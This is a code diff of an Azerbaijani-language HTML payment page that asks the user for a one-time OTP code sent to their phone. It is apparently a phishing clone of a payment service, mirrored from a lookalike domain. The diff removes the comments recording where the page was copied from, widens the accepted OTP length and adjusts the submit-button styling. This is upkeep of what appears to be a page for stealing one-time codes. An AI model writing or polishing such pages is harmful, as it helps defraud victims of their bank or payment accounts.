@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<!-- Mirrored from m10balans.online/number/pay/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Dec 2024 09:36:22 GMT -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -48,19 +47,23 @@
             padding: 10px;
             border: none;
             border-radius: 40px;
-            background-color: #d30412:
+            background-color: #cccccc; /* Default gray when disabled */
             color: #fff;
-            cursor: pointer;
+            cursor: not-allowed;
             font-size: 16px;
             transition: background-color 0.3s ease;
             margin-top: 20px; /* Butonu yukarı taşı */
         }
+        button:enabled {
+            background-color: #45a049; /* Green color when enabled */
+            cursor: pointer;
+        }
         button:disabled {
-            background-color: #cccccc;
+            background-color: #cccccc; /* Disable color when button is disabled */
             cursor: not-allowed;
         }
         button:hover {
-            background-color: #45a049;
+            background-color: #45a049; /* Hover effect for green button */
         }
         .logo {
             margin-bottom: 20px;
@@ -84,11 +87,7 @@
             font-size: 2rem;
             color: #333;
             margin-bottom: 20px;
-
         }
-
-
-        
     </style>
 </head>
 <body>
@@ -100,7 +99,7 @@
             <div class="form-group">
                 <div class="item item-indent">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin. </div>
                 <label for="cardName">Şifrə göndərildi: +994*******</label>
-                <input type="number" id="cardName" placeholder="Otp Kod" maxlength="6" minlength="6" required>
+                <input type="number" id="cardName" placeholder="Otp Kod" maxlength="7" minlength="4" required>
             </div>
       
             <div style="text-align: center;">
@@ -153,7 +152,8 @@
             
             var submitButton = document.getElementById("submitButton");
 
-            if (cardName.trim().length >= 4) {
+            // Otp kodunun uzunluğunun 4 ile 7 arasında olup olmadığını kontrol et
+            if (cardName.trim().length >= 4 && cardName.trim().length <= 7) {
                 submitButton.disabled = false;
             } else {
                 submitButton.disabled = true;
@@ -259,5 +259,4 @@
 
 </body>
 
-<!-- Mirrored from m10balans.online/number/pay/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Dec 2024 09:36:24 GMT -->
 </html>
